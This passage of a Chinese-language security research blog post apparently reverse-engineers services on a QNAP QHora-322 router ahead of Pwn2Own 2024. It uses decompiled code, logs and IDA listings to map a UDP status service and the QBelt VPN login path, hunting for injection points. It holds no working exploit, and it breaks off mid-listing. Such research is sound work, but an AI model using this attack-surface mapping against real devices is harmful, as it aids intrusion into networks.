class="built_in">Value</span>((Json::Value *)v140);</span><br><span class="line">      v107 = Json::Value::<span class="keyword">operator</span>[](v139, <span class="string">&quot;Result&quot;</span>);</span><br><span class="line">      Json::Value::<span class="built_in">Value</span>((Json::Value *)v140, v100);</span><br><span class="line">      Json::Value::<span class="keyword">operator</span>=(v107, v140);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)v140);</span><br><span class="line">      Json::FastWriter::write[abi:cxx11](v141, v139);</span><br><span class="line">      <span class="built_in">sub_4C6DC</span>(&amp;v134, v140);</span><br><span class="line">      std::string::_M_dispose(v140);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="built_in">sendto</span>(*((_DWORD *)<span class="keyword">this</span> + <span class="number">1</span>), v134, v135, <span class="number">0</span>, &amp;v132, addr_len) &amp; <span class="number">0x8000000000000000LL</span>) != <span class="number">0</span> ) <span class="comment">//[9]</span></span><br><span class="line">      &#123;</span><br><span class="line">               <span class="comment">//log print</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>可以看到处理也比较简单, 在[1]处接收了我们的请求, 并且在[2],[3],[4]获取了我们发送的json, [5],[6],[7],[8]获取了一些系统信息,简单看两个吧.</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">__int64 <span class="title">get_ipsec_intalled_num</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// w20</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">32</span>]; <span class="comment">// [xsp+30h] [xbp+30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// [xsp+50h] [xbp+50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_531C8</span>((<span class="type">int</span>)v2, <span class="string">&quot;/sbin/ipsec statusall | /bin/grep -c INSTALLED&quot;</span>);</span><br><span class="line">  <span class="built_in">exec</span>(v2);</span><br><span class="line">  v0 = <span class="built_in">atoi</span>(nptr);</span><br><span class="line">  std::string::_M_dispose(&amp;nptr);</span><br><span class="line">  std::string::_M_dispose(v2);</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">float</span> <span class="title">get_mem_usage</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">double</span> v0; <span class="comment">// d8</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">32</span>]; <span class="comment">// [xsp+30h] [xbp+30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// [xsp+50h] [xbp+50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_531C8</span>((<span class="type">int</span>)v2, <span class="string">&quot;/bin/free -m | /bin/grep Mem | /bin/awk &#x27;&#123;print $3/$2 * 100.0&#125;&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">exec</span>(v2);</span><br><span class="line">  v0 = <span class="built_in">atof</span>(nptr);</span><br><span class="line">  std::string::_M_dispose(&amp;nptr);</span><br><span class="line">  std::string::_M_dispose(v2);</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>我们并没有可以控制的shell字符串, 命令注入的希望破灭了, 可以看到最后返回了Sender,Receiver,RemoteWan,Cpu,Memory,Connections,Result,在[9]处发送了返回.</p>
</blockquote>
<blockquote>
<p>最后总结,这个服务运行在7788端口上使用UDP发送<code>&#123;&quot;Sender&quot;:1,&quot;Receiver&quot;:0,&quot;Wan&quot;:1&#125;</code>Receiver会需要根据实际情况进行更改, 返回统计ipsec信息,CPU的使用百分比,系统内存的使用百分比,device_info.json的port的端口信息.</p>
</blockquote>
<h3 id="qthd-4433"><a href="#qthd-4433" class="headerlink" title="qthd-4433"></a>qthd-4433</h3><blockquote>
<p>这个服务非常有趣可以通过官网查到这是一个qnap的专有vpn协议, 名为<code>QBelt VPN</code>协议, 可以看到在官方的宣传页上这个协议支持的认证方法有 PSK, Certification, Username and password.</p>
</blockquote>
<blockquote>
<p>继续分析这个服务, 当我在本地跑起这个服务后我们看到了如下日志</p>
</blockquote>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">tunnel_interface : qtun0 </span><br><span class="line">pid_path:/var/run/network/qthd.pid , curr_conf_path:/var/run/network/qtun0_qthd.json.curr </span><br><span class="line">main: <span class="built_in">set</span> dns_ip_to_client: 198.18.2.1</span><br><span class="line">get_qs_data: qs_call failed ret:2</span><br><span class="line">edit_reserved_udp_ipset: cmd: /usr/sbin/ipset -! add RESERVEDUDP 4433</span><br><span class="line">init_clean_online_user: qservice_call QVPNDBMgr.CleanOnlineClient &#123;<span class="string">&quot;protocol&quot;</span>:0,<span class="string">&quot;type_management&quot;</span>:0&#125; failed, ret=-13</span><br><span class="line">qtund_read_cb: Cannot find client entry <span class="keyword">in</span> QUEUE</span><br><span class="line">qtund_read_cb: Cannot find client entry <span class="keyword">in</span> QUEUE</span><br><span class="line">qtund_read_cb: Cannot find client entry <span class="keyword">in</span> QUEUE</span><br><span class="line">client_addr:127.0.0.1,port:33060</span><br><span class="line">qth_server.c:qth_bind_to_device:1923: ifindex:1</span><br><span class="line">qth_server.c:qth_bind_to_device:1937: Bind to [lo]</span><br><span class="line">client_addr:127.0.0.1,port:33060</span><br><span class="line">qth_server.c:qth_bind_to_device:1923: ifindex:1</span><br><span class="line">qth_server.c:qth_bind_to_device:1937: Bind to [lo]</span><br><span class="line">qtund_read_cb: Cannot find client entry <span class="keyword">in</span> QUEUE</span><br><span class="line">client_addr:192.168.199.244,port:59361</span><br><span class="line">qth_server.c:qth_bind_to_device:1923: ifindex:2</span><br><span class="line">qth_server.c:qth_bind_to_device:1937: Bind to [ens160]</span><br><span class="line">client_addr:192.168.199.244,port:59361</span><br><span class="line">qth_server.c:qth_bind_to_device:1923: ifindex:2</span><br><span class="line">qth_server.c:qth_bind_to_device:1937: Bind to [ens160]</span><br><span class="line">^Cqth_stop: signum is 2</span><br><span class="line">get_qs_data: qs_call failed ret:2</span><br><span class="line">qth_server.c:qth_loop:1992: 0xffff9c00aa90 mbedtls_net_accept returned -74 (-0x4a)</span><br><span class="line">init_clean_online_user: qservice_call QVPNDBMgr.CleanOnlineClient &#123;<span class="string">&quot;protocol&quot;</span>:0,<span class="string">&quot;type_management&quot;</span>:0&#125; failed, ret=-13</span><br><span class="line">edit_reserved_udp_ipset: cmd: /usr/sbin/ipset -! del RESERVEDUDP 4433</span><br><span class="line">main error code: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>当然我并不能在其中找到任何的发现, 除了发现它使用了mbedtls套件之外好像什么都没有, 看来我们需要下载一个客户端来研究研究了, 当然我们看官方文档是如何配置QBelt连接.</p>
</blockquote>
<blockquote>
<p>搜索后我们可以做到一个叫<code>QVPN Device Client</code>客户端, 查看文档后我们可以知道如何配置连接.</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/Pwn2Own-2024-QHora-322/qvpn.png"
                      alt="img"
                ></p>
<blockquote>
<p>需要提供账号密码和psk,通过官方对于这个协议的介绍QBelt 是 QNAP 专有的通信协议，结合了 DTLS 和 AES-256 加密, 也可以看到一些信息, 所以他是如何验证账号密码呢? 我并不能直接在qthd的<code>recvmsg</code>附近找到什么函数调用，所以我掏出最终技搜索字符串.</p>
</blockquote>
<blockquote>
<p>在程序中找到了关于user和pwd的json字段,进入调用这个字符串的函数<code>sub_40627C()</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/Pwn2Own-2024-QHora-322/struser.png"
                      alt="img"
                ></p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40627C</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">const</span> <span class="type">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v6; <span class="comment">// x20</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// w1</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [xsp+6E0h] [xbp+6E0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v24 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="built_in">qs_io_create</span>();</span><br><span class="line">  <span class="built_in">memset</span>(v36, <span class="number">0</span>, <span class="number">0xFCuLL</span>);</span><br><span class="line">  v41[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v41[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x7F0uLL</span>);</span><br><span class="line">  *(_QWORD *)buf = <span class="number">0LL</span>;</span><br><span class="line">  v27 = <span class="number">0LL</span>;</span><br><span class="line">  v39[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v39[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)name = <span class="number">0LL</span>;</span><br><span class="line">  v29 = <span class="number">0LL</span>;</span><br><span class="line">  v30 = <span class="number">0LL</span>;</span><br><span class="line">  v31 = <span class="number">0LL</span>;</span><br><span class="line">  v32 = <span class="number">0LL</span>;</span><br><span class="line">  v33 = <span class="number">0LL</span>;</span><br><span class="line">  v34 = <span class="number">0LL</span>;</span><br><span class="line">  v35 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v40, <span class="number">0</span>, <span class="number">0x3F0uLL</span>);</span><br><span class="line">  timer = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_40A4F8</span>(<span class="string">&quot;%s: qs_io_create failed\n&quot;</span>, <span class="string">&quot;verify_user_account&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">-14</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">strlen</span>(a3);</span><br><span class="line">  <span class="built_in">sub_40A4F8</span>(<span class="string">&quot;%s: pw len: %d\n&quot;</span>, <span class="string">&quot;verify_user_account&quot;</span>, v9);</span><br><span class="line">  <span class="built_in">memset</span>(v38, <span class="number">0</span>, <span class="number">0x100uLL</span>);</span><br><span class="line">  v10 = <span class="built_in">strlen</span>(a3);</span><br><span class="line">  <span class="built_in">sub_40A3EC</span>(v38, a3, v10);</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    (<span class="type">char</span> *)v41,</span><br><span class="line">    <span class="number">0x800uLL</span>,</span><br><span class="line">    <span class="string">&quot;&#123;\&quot;user_name\&quot;:\&quot;%s\&quot;,\&quot;pw\&quot;:\&quot;%s\&quot;,\&quot;capability\&quot;:%d,\&quot;role_type\&quot;:%d&#125;&quot;</span>,</span><br><span class="line">    a2,</span><br><span class="line">    v38,</span><br><span class="line">    <span class="number">1LL</span>,</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">1948</span>)); <span class="comment">//[1]</span></span><br><span class="line">  v11 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)v41);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">qs_io_write</span>(v6, v41, v11) == <span class="number">-1</span> ) <span class="comment">//[2]</span></span><br><span class="line">  &#123;</span><br><span class="line">    v12 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">sub_40A4F8</span>(<span class="string">&quot;%s: qs_io_write failed\n&quot;</span>, <span class="string">&quot;verify_user_account&quot;</span>);</span><br><span class="line">LABEL_6:</span><br><span class="line">    <span class="built_in">LODWORD</span>(v13) = <span class="number">-16</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">  &#125;</span><br><span class="line">  v14 = <span class="built_in">qs_call</span>(<span class="string">&quot;QVPNDBMgr&quot;</span>, <span class="string">&quot;VerifyUserAcct&quot;</span>, v6, <span class="number">5LL</span>, <span class="number">0xFFFFFFFFLL</span>); <span class="comment">//[3]</span></span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">sub_40A4F8</span>(<span class="string">&quot;%s: qs_call failed ret:%d\n&quot;</span>, <span class="string">&quot;verify_user_account&quot;</span>, v14);</span><br><span class="line">LABEL_9:</span><br><span class="line">    <span class="built_in">LODWORD</span>(v13) = <span class="number">-13</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = <span class="built_in">qs_io_read</span>(v6, &amp;v24, <span class="number">0LL</span>);</span><br><span class="line">  v16 = (_DWORD *)<span class="built_in">json_loads</span>(v15, <span class="number">0LL</span>, v36);</span><br><span class="line">  v12 = v16;</span><br><span class="line">  <span class="keyword">if</span> ( !v16 || *v16 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_40A4F8</span>(<span class="string">&quot;%s: root isn&#x27;t an object. %d: %s\n&quot;</span>, <span class="string">&quot;verify_user_account&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v36[<span class="number">0</span>], v37);</span><br><span class="line">LABEL_13:</span><br><span class="line">    <span class="built_in">LODWORD</span>(v13) = <span class="number">-2</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = (_DWORD *)<span class="built_in">json_object_get</span>();</span><br><span class="line">  v18 = v17;</span><br><span class="line">  <span class="keyword">if</span> ( !v17 || *v17 != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_40A4F8</span>(<span class="string">&quot;%s: val isn&#x27;t an integer. %d: %s\n&quot;</span>, <span class="string">&quot;verify_user_account&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v36[<span class="number">0</span>], v37);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = ((__int64 (*)(<span class="type">void</span>))json_integer_value)();</span><br><span class="line">  <span class="keyword">if</span> ( v13 )</span><br><span class="line">  &#123;</span><br><span class="line">    ptra = (<span class="type">char</span> *)<span class="built_in">json_dumps</span>(v12, <span class="number">4LL</span>);</span><br><span class="line">    <span class="built_in">sub_40A4F8</span>(<span class="string">&quot;%s: %s.%s failed %s\n&quot;</span>, <span class="string">&quot;verify_user_account&quot;</span>, <span class="string">&quot;QVPNDBMgr&quot;</span>, <span class="string">&quot;VerifyUserAcct&quot;</span>, ptra);</span><br><span class="line">    <span class="built_in">free</span>(ptra);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">1948</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">gethostname</span>(name, <span class="number">0x40uLL</span>) == <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;gethostname&quot;</span>);</span><br><span class="line">        <span class="built_in">LODWORD</span>(v13) = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">json_integer_value</span>(v18) == <span class="number">-1005</span> || <span class="built_in">json_integer_value</span>(v18) == <span class="number">-1008</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">inet_ntop</span>(<span class="number">2</span>, (<span class="type">const</span> <span class="type">void</span> *)(a1 + <span class="number">1952</span>), buf, <span class="number">0x10u</span>);</span><br><span class="line">        v19 = <span class="number">237</span>;</span><br><span class="line">        <span class="built_in">snprintf</span>((<span class="type">char</span> *)v39, <span class="number">0x400uLL</span>, <span class="string">&quot;[\&quot;%s\&quot;, \&quot;%s\&quot;, \&quot;%s\&quot;]&quot;</span>, a2, buf, name);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">json_integer_value</span>(v18) == <span class="number">-1007</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v19 = <span class="number">236</span>;</span><br><span class="line">        <span class="built_in">snprintf</span>((<span class="type">char</span> *)v39, <span class="number">0x400uLL</span>, <span class="string">&quot;[\&quot;%s\&quot;, \&quot;%s\&quot;]&quot;</span>, a2, name);</span><br><span class="line">LABEL_25:</span><br><span class="line">        <span class="built_in">memset</span>(v41, <span class="number">0</span>, <span class="number">0x800uLL</span>);</span><br><span class="line">        <span class="built_in">time</span>(&amp;timer);</span><br><span class="line">        <span class="built_in">snprintf</span>(</span><br><span class="line">          (<span class="type">char</span> *)v41,</span><br><span class="line">          <span class="number">0x800uLL</span>,</span><br><span class="line">          <span class="string">&quot;&#123;\&quot;msg_id\&quot;:%d,\&quot;timestamp\&quot;:%lu,\&quot;values\&quot;:%s&#125;&quot;</span>,</span><br><span class="line">          v19,</span><br><span class="line">          timer,</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)v39);</span><br><span class="line">        <span class="built_in">qs_io_realloc</span>(v6, <span class="number">0LL</span>);</span><br><span class="line">        v20 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)v41);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">qs_io_write</span>(v6, v41, v20) == <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">sub_40A4F8</span>(<span class="string">&quot;%s: qs_io_write failed\n&quot;</span>, <span class="string">&quot;verify_user_account&quot;</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sub_40A4F8</span>(<span class="string">&quot;%s: send msg: %s\n&quot;</span>, <span class="string">&quot;verify_user_account&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v41);</span><br><span class="line">        v21 = <span class="built_in">qs_call</span>(<span class="string">&quot;nm-grpc-handler&quot;</span>, <span class="string">&quot;DeviceLog&quot;</span>, v6, <span class="number">5LL</span>, <span class="number">0xFFFFFFFFLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v21 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">sub_40A4F8</span>(<span class="string">&quot;%s: qs_call failed ret:%d\n&quot;</span>, <span class="string">&quot;verify_user_account&quot;</span>, v21);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">LODWORD</span>(v13) = <span class="number">-2011</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_14:</span><br><span class="line">  ptr = v13;</span><br><span class="line">  <span class="built_in">qs_io_free</span>(v6);</span><br><span class="line">  v7 = ptr;</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_406258</span>(v12);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>可以看到在[1]处调用我们搜索到的字符串, 并使用<code>snprintf()</code>函数格式化字符串, 之后到[2]处传入了v41貌似在写什么, 并在v6中返回了回来在最后调用了<code>qs_call()</code>函数, 我完全相信了这就是验证账号密码的函数, 因为从日志输出或者调用的字符串<code>verify_user_account</code>看来是那么的符合, 所以究竟如何验证的账号密码, 现在我们可以来看一个非常重要的函数<code>qs_call()</code>了.</p>
</blockquote>
<h3 id="qs-call和总结"><a href="#qs-call和总结" class="headerlink" title="qs_call和总结"></a>qs_call和总结</h3><blockquote>
<p>qs_call函数我没有跟进去看，所以我还是采用老方法搜索<code>VerifyUserAcct</code>字符串, 可以看看上面的例子<code>qs_call(&quot;QVPNDBMgr&quot;, &quot;VerifyUserAcct&quot;, v6, 5LL, 0xFFFFFFFFLL);</code>, 很快就会找到一个既符合第一个参数的程序名称, 又可以在这个程序中找到<code>VerifyUserAcct</code>关键字, 它就是<code>/usr/sbin/qvpn_db_mgr</code>看来这就是我们想找的程序了, 来到IDA Pro!</p>
</blockquote>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.data:000000000049C978 F4 28 46 00 00 00 00 00       DCQ aVerifyuseracct                     ; &quot;VerifyUserAcct&quot;</span><br><span class="line">.data:000000000049C980 03 29 46 00 00 00 00 00       DCQ aVerifyuseracct_0                   ; &quot;\n    VerifyUserAcct\n\n    Description&quot;...</span><br><span class="line">.data:000000000049C988 68 2B 42 00 00 00 00 00       DCQ sub_422B68</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>在data段中我们再一次找到了它, 那就进入<code>sub_422B68()</code>函数吧</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_422B68</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_42209C</span>(a1, <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>只是在call另外一个函数并将第二个参数设置为4, 那就继续跟进入<code>sub_42209C</code>吧.</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_42209C</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// w19</span></span><br><span class="line">   <span class="comment">//.....</span></span><br><span class="line">  __int64 v56; <span class="comment">// [xsp+1A0h] [xbp+1A0h]</span></span><br><span class="line">  __int64 v57; <span class="comment">// [xsp+1A8h] [xbp+1A8h]</span></span><br><span class="line"></span><br><span class="line">  v45 = <span class="number">4</span>;</span><br><span class="line">  v47 = <span class="number">126LL</span>;</span><br><span class="line">  v54 = <span class="number">2</span>;</span><br><span class="line">  v43 = off_460430;</span><br><span class="line">  v44 = <span class="number">0LL</span>;</span><br><span class="line">  v46 = <span class="string">&quot;qvpn_db_mgr.cpp&quot;</span>;</span><br><span class="line">  v48 = <span class="string">&quot;int qs_io_wrapper(qs_io*, int)&quot;</span>;</span><br><span class="line">  v49 = <span 